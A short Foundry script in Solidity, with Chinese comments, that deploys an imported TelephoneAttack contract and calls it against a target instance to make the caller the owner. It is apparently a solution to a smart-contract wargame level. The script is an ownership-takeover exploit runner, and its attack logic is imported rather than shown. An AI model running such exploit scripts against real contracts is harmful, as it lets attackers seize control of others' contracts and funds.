// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {TelephoneAttack} from "../src/TelephoneAttack.sol"; // 正確導入

contract TelephoneAttackScript is Script {
    function run() external {
        // 從環境變數讀取配置
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address targetAddress = vm.envAddress("INSTANCE_ADDRESS");
        address myAddress = vm.addr(deployerPrivateKey);

        // 開始廣播交易
        vm.startBroadcast(deployerPrivateKey);

        // 1. 部署攻擊合約
        TelephoneAttack attackContract = new TelephoneAttack();
        
        console.log("Attack contract deployed at:", address(attackContract));

        // 2. 執行攻擊
        attackContract.attack(targetAddress, myAddress);
        
        console.log("Attack executed. Target owner should be:", myAddress);

        vm.stopBroadcast();
    }
}
